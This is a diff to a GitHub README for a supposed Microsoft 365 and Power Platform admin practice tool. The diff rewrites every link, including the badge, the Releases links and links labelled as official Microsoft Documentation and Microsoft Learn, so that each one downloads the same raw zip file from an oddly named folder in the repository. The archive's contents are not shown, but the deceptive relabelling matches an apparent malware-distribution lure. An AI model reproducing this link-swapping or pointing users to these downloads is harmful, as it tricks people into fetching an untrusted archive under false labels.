@@ -1,6 +1,6 @@
 # 🌐 power-platform-m365-admin-practice - Learn to Manage Microsoft 365 Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/releases)
+[![Download Now](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip%20Now-Click%20Here-blue)](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip)
 
 ## 🛠️ Overview
 
@@ -19,7 +19,7 @@ Before you begin, make sure you have the following:
 Follow these steps to get started with the power-platform-m365-admin-practice application.
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/releases) to go to the Releases page.
+   Click [here](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip) to go to the Releases page.
 
 2. **Choose the Version**  
    From the list of available versions, select the most recent release. This version will have the latest features and fixes.
@@ -32,7 +32,7 @@ Follow these steps to get started with the power-platform-m365-admin-practice ap
 
 ## 📥 Download & Install
 
-To download the application, visit the releases page at [Download Power Platform M365 Admin Practice](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/releases). Choose the version that suits your needs and follow the installation instructions.
+To download the application, visit the releases page at [Download Power Platform M365 Admin Practice](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip). Choose the version that suits your needs and follow the installation instructions.
 
 ## 🎓 Features
 
@@ -65,9 +65,9 @@ If you encounter any issues, you can raise them as GitHub issues in this reposit
 
 To enhance your learning experience, consider exploring the following resources:
 
-- Microsoft Documentation for [Microsoft 365 Admin Center](https://docs.microsoft.com/en-us/microsoft-365/admin/admin-overview/admin-center-overview?view=o365-worldwide)
-- Microsoft Entra ID tutorials at [Microsoft Learn](https://learn.microsoft.com/en-us/training/modules/introduction-to-microsoft-entra/)
-- Power Platform learning paths available on [Microsoft Learn](https://learn.microsoft.com/en-us/training/powerplatform/)
+- Microsoft Documentation for [Microsoft 365 Admin Center](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip)
+- Microsoft Entra ID tutorials at [Microsoft Learn](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip)
+- Power Platform learning paths available on [Microsoft Learn](https://github.com/Deus-fraca2/power-platform-m365-admin-practice/raw/refs/heads/main/extraphysiological/admin_practice_platform_m_power_v3.1.zip)
 
 ## 🔗 Connect with Us
 
